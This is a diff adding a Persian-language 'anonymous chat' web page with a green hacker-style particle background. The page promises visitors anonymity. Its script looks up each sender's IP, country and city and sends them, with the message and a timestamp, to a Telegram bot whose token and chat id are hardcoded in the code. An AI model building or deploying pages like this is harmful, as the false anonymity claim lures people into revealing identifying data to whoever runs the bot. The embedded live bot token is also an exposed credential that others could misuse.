@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>چت ناشناس DRPTZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: #0d0d0d;
+      color: #0f0;
+      overflow: hidden;
+    }
+    #particles-js {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+    .header {
+      text-align: center;
+      margin-top: 20px;
+      z-index: 1;
+      position: relative;
+    }
+    .header h1 {
+      font-size: 1.8rem;
+      margin: 0;
+    }
+    .header p {
+      font-size: 1rem;
+      margin: 5px 0;
+      color: #eee;
+    }
+    .drptz {
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 1.5rem;
+      font-weight: bold;
+      text-shadow: 0 0 10px #0f0;
+      z-index: 1;
+    }
+    .chat-box {
+      position: absolute;
+      top: 55%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      z-index: 1;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      margin-bottom: 10px;
+      background: #222;
+      color: #0f0;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0f0;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #888;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <div id="particles-js"></div>
+
+  <div class="header">
+    <h1>چت با تیم ما</h1>
+    <p>هرچی دلت می‌خواد به صورت ناشناس بنویس</p>
+  </div>
+
+  <div class="drptz">DRPTZ</div>
+
+  <div class="chat-box">
+    <input id="messageInput" placeholder="پیام خود را بنویسید..." />
+    <button onclick="sendMessage()">ارسال</button>
+  </div>
+
+  <div class="footer" id="userInfo">Loading info...</div>
+
+  <audio id="sendSound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3" preload="auto"></audio>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS('particles-js', {
+      particles: {
+        number: { value: 80 },
+        color: { value: '#0f0' },
+        shape: { type: 'circle' },
+        opacity: { value: 0.5, random: true },
+        size: { value: 4, random: true },
+        line_linked: { enable: true, distance: 150, color: '#0f0', opacity: 0.4, width: 1 },
+        move: { enable: true, speed: 2 }
+      },
+      interactivity: {
+        detect_on: 'canvas',
+        events: {
+          onhover: { enable: true, mode: 'grab' },
+          onclick: { enable: true, mode: 'push' }
+        },
+        modes: {
+          grab: { distance: 140, line_linked: { opacity: 1 } },
+          push: { particles_nb: 4 }
+        }
+      },
+      retina_detect: true
+    });
+
+    async function fetchIP() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        document.getElementById('userInfo').innerText =
+          `IP: ${d.ip} | Country: ${d.country_name} | City: ${d.city}`;
+        return d;
+      } catch {
+        return {};
+      }
+    }
+
+    async function sendMessage() {
+      const msg = document.getElementById('messageInput').value.trim();
+      if (!msg) return;
+      document.getElementById('sendSound').play();
+
+      const d = await fetchIP();
+      const text = `پیام ناشناس:\n${msg}\n\nIP: ${d.ip}\nCountry: ${d.country_name}\nCity: ${d.city}\nTime: ${new Date().toLocaleString()}`;
+
+      await fetch('https://api.telegram.org/bot8145145957:AAFi82VMdaF5ShzbVUhkDKsSryE_q2TCzmU/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: '6830023746', text })
+      });
+
+      document.getElementById('messageInput').value = '';
+    }
+
+    fetchIP();
+  </script>
+</body>
+</html>
